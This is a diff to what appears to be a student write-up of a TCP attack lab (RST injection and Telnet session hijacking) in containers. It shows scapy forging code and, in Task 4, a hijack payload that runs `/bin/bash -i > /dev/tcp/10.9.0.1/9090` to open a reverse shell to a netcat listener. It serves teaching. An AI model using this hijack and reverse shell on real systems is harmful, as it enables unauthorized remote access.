@@ -164,7 +164,7 @@ def sendrst(pkt):
 pkt = sniff(iface ='br-774a3b00e93c', filter ='tcp', prn=sendrst)
 ```
 
-In this example we run the code after the Telnet login:
+In this example we run the code after the Telnet login (but you can run it when you want):
 ```bash
 root@472341f5fb4b:/# telnet 10.9.0.5
 Trying 10.9.0.5...
@@ -174,6 +174,8 @@ Ubuntu 20.04.1 LTS
 abb6db62e897 login: seed
 Password: 
 Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)
+
+seed@abb6db62e897:~$
 ```
 
 ### Results
@@ -298,13 +300,15 @@ root@abb6db62e897:/# ls /home/seed
 autoHacked.txt
 ```
 
+The session hijacking causes a desync of the client and the server. This is because the client receives an ACK for a packet it never sent.
+
 # TASK 4
 
 For the last task we want to refer to some of the steps we used in task 3.
 
-So we star by forging an hijacking attack but with a payload that enable us to execute a reverse shell from the server (10.9.0.5) and our attacking machine (10.9.0.1).
+So we start by forging an hijacking attack but with a payload that enable us to execute a reverse shell from our attacking machine (10.9.0.1) through the server (10.9.0.5).
 
-We gather Sequence number, payload size and Acknowledgment number and forge the packet.
+We gather SEQ number, payload size and ACK number and forge the packet.
 
 ```py
 #!/usr/bin/env python3
@@ -321,8 +325,8 @@ ls(pkt)
 send(pkt,verbose=0)
 ```
 
-We open a tcp connection on our machine through the use of netcat: `netcat -lnv 9090`.
+We open a TCP connection on our machine through the use of netcat: `netcat -lnv 9090`.
 
-We then send the forged packet and see if the shell connects to our machine, remembering to add carriage return (`\r`) and newline (`\r`) to be sure that the command is executed on the server: `data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"`
+We then send the forged packet and see if the shell connects to our machine, remembering to add carriage return (`\r`) and newline (`\n`) to be sure that the command is executed on the server: `data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"`
 
 We did everything correctly and the reverse shell connected succesfully.
